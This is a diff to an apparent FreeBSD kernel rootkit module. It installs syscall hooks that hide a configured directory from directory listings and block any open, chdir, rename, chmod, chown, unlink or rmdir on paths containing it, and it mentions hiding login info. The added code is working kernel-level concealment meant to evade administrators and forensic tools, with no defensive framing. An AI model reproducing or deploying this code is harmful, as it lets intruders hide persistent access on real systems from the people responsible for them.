@@ -41,6 +41,11 @@ static int protector(struct thread *td, void *syscall_args)
     return (0);
 }
 
+/*
+ * ====================Immutability Hooks====================
+ * unlink_hook, rmdir_hook, rename_hook
+ * ==========================================================
+*/
 /* unlink hook - prevent file removal */
 static int unlink_hook(struct thread *td, void *syscall_args)
 {
@@ -52,20 +57,13 @@ static int unlink_hook(struct thread *td, void *syscall_args)
     /* Copy arguments to kernel space */
     char path[NAME_MAX];
     size_t copied;
-    if (copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT)
+    if (copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
         /* Error Copying Path */
         return (EFAULT);
+    }
 
     /* All files under HIDDENDIR should be protected */
-    size_t dirsize = sizeof(HIDDENDIR);
-    char buf[dirsize + 1]; //With \0 termination
-    bcopy(path, buf, dirsize);
-    buf[dirsize] = '\0';
-    uprintf("path=%s\n", path);
-    uprintf("buf=%s\n", buf);
-    if(strcmp(buf, HIDDENDIR)) {
-        uprintf("YES!!!\n");
-        /* return no such file or directory */
+    if (strstr(path, HIDDENDIR)) {
         return (ENOENT);
     }
 
@@ -77,18 +75,19 @@ static int unlink_hook(struct thread *td, void *syscall_args)
 static int rmdir_hook(struct thread *td, void *syscall_args)
 {
     struct rmdir_args /* {
-            const char *path
+            const char *path //Path to the directory to be removed
             }*/*args;
     args = (struct rmdir_args *)syscall_args;
 
     /* Copy arguments to kernel space */
     char path[NAME_MAX];
     size_t copied;
-    if (copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT)
+    if (copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
         /* Error Copying Path */
         return (EFAULT);
+    }
 
-    /* Check if the directory to be deleted matches the HIDDENDIR */
+    /* Check if the directory to be deleted contains the HIDDENDIR */
     if (strstr(path, HIDDENDIR)) {
         /* As long as the path contains the hidden directory name */
         return (ENOENT);
@@ -96,6 +95,141 @@ static int rmdir_hook(struct thread *td, void *syscall_args)
 
     /* Otherwise, call the original system call */
     return (sys_rmdir(td, syscall_args));
+}
+
+/* remane hook - Prevent file/directory name change */
+static int rename_hook(struct thread *td, void *syscall_args)
+{
+    struct rename_args /*{
+        const char *from;
+        const char *to;
+    }*/*args;
+    args = (struct rename_args *)syscall_args;
+
+    /* Copy arguments to kernel space */
+    char path[NAME_MAX];
+    size_t copied;
+    if (copyinstr(args->from, path, NAME_MAX, &copied) == EFAULT) {
+        /* Error Copying Path */
+        return (EFAULT);
+    }
+
+    /* Check if the from path contains the HIDDENDIR */
+    if (strstr(path, HIDDENDIR)) {
+        return (ENOENT);
+    }
+
+    /* Otherwise, call the original system call */
+    return (sys_rename(td, syscall_args));
+}
+
+/* chmod hook - prevent file/directory mode modification */
+static int chmod_hook(struct thread *td, void *syscall_args)
+{
+    struct chmod_args /*{
+        const char *path; //Path to the directory/file to be changed
+        mode_t mode;
+    }*/*args;
+    args = (struct chmod_args *)syscall_args;
+
+    /* TODO: Do I need to hide login info here as well? */
+    /* Copy arguments to kernel space */
+    char path[NAME_MAX];
+    size_t copied;
+    if(copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
+        /* Error Copying Path */
+        return (EFAULT);
+    }
+
+    /* Check if the path contains the HIDDENDIR */
+    if (strstr(path, HIDDENDIR)) {
+        return (ENOENT);
+    }
+
+    /* Otherwise, call the original system call */
+    return (sys_chmod(td, syscall_args));
+}
+
+/* chown hook - prevent file/directory ownership change */
+static int chown_hook(struct thread *td, void *syscall_args)
+{
+    struct chown_args /*{
+        const char *path; //path to the file/directory to be changed
+        uid_t owner;
+        gid_t group;
+    }*/ *args;
+    args = (struct chown_args *)syscall_args;
+
+    /* Copy arguments to kernel space */
+    char path[NAME_MAX];
+    size_t copied;
+    if(copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
+        /* Error Copying Path */
+        return (EFAULT);
+    }
+
+    /* Check if the path contains the HIDDENDIR */
+    if(strstr(path, HIDDENDIR)) {
+        return (ENOENT);
+    }
+
+    /* Otherwise, call the original system call */
+    return (sys_chown(td, syscall_args));
+}
+/*
+ * ==================Invisibility Hooks=================
+ * open_hook, chdir_hook, getdirentries_hook
+ * =====================================================
+*/
+/* open hook - prevent hiddendir and files under it to be shown or opended */
+static int open_hook(struct thread *td, void *syscall_args)
+{
+    struct open_args /*{
+        const char *path;
+        int flags;
+    }*/*args;
+    args = (struct open_args *)syscall_args;
+
+    /* Copy arguments to kernel space */
+    char path[NAME_MAX];
+    size_t copied;
+    if(copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
+        /* Error Copying Path */
+        return (EFAULT);
+    }
+
+    /* Check if directory/file to be opened contains HIDDENDIR */
+    if (strstr(path, HIDDENDIR)) {
+        return (ENOENT);
+    }
+
+    /* Otherwise, call the original system call */
+    return (sys_open(td, syscall_args));
+}
+
+/* chdir hook - prevent directory traversal to the hiddendir */
+static int chdir_hook(struct thread *td, void *syscall_args)
+{
+    struct chdir_args /*{
+        const char *path; //Path to change current working directory to
+    }*/*args;
+    args = (struct chdir_args *)syscall_args;
+
+    /* Copy arguments to kernel space */
+    char path[NAME_MAX];
+    size_t copied;
+    if(copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT) {
+        /* ERROR Copying Path */
+        return (EFAULT);
+    }
+
+    /* Check if the target directory path contains HIDDENDIR */
+    if (strstr(path, HIDDENDIR)) {
+        return (ENOENT);
+    }
+
+    /* Otherwise, call the original system call */
+    return (sys_chdir(td, syscall_args));
 }
 
 /* getdirentries hook - hide file/directory */
@@ -143,7 +277,8 @@ static int getdirentries_hook(struct thread *td, void *syscall_args)
             count -= reclen;
 
             /* Check if the entry name matches the hide config */
-            if (strcmp((char *)&(currptr->d_name), (char *)HIDDENDIR) == 0){
+            //if (strcmp((char *)&(currptr->d_name), (char *)HIDDENDIR) == 0){
+            if (strstr((char *)&(currptr->d_name), (char *)HIDDENDIR)) {
                 /* If the currptr is pointing to the last entry, no need to remove */
                 if (count != 0) {
                     /* Copy the rest of entries to the address of current node, overwrite the hidden file */
@@ -197,19 +332,29 @@ static int load(struct module *module, int cmd, void *arg)
     switch(cmd) {
         case MOD_LOAD:
             #if KERNDEBUG == 1
-            uprintf("Hooking getdirentries, unlink, rmdir....\n");
+            uprintf("Hooking getdirentries, unlink, rmdir, open, chdir, rename....\n");
             #endif
             sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
             sysent[SYS_unlink].sy_call = (sy_call_t *)unlink_hook;
             sysent[SYS_rmdir].sy_call = (sy_call_t *)rmdir_hook;
+            sysent[SYS_open].sy_call = (sy_call_t *)open_hook;
+            sysent[SYS_chdir].sy_call = (sy_call_t *)chdir_hook;
+            sysent[SYS_rename].sy_call = (sy_call_t *)rename_hook;
+            sysent[SYS_chmod].sy_call = (sy_call_t *)chmod_hook;
+            sysent[SYS_chown].sy_call = (sy_call_t *)chown_hook;
             break;
         case MOD_UNLOAD:
             #if KERNDEBUG == 1
-            uprintf("Unhooking getdirentries, unlink, rmdir....\n");
+            uprintf("Unhooking getdirentries, unlink, rmdir, open, chdir, rename....\n");
             #endif
             sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
             sysent[SYS_unlink].sy_call = (sy_call_t *)sys_unlink;
             sysent[SYS_rmdir].sy_call = (sy_call_t *)sys_rmdir;
+            sysent[SYS_open].sy_call = (sy_call_t *)sys_open;
+            sysent[SYS_chdir].sy_call = (sy_call_t *)sys_chdir;
+            sysent[SYS_rename].sy_call = (sy_call_t *)sys_rename;
+            sysent[SYS_chmod].sy_call = (sy_call_t *)sys_chmod;
+            sysent[SYS_chown].sy_call = (sy_call_t *)sys_chown;
             break;
         default:
             error = EOPNOTSUPP; /* Operation not supported */
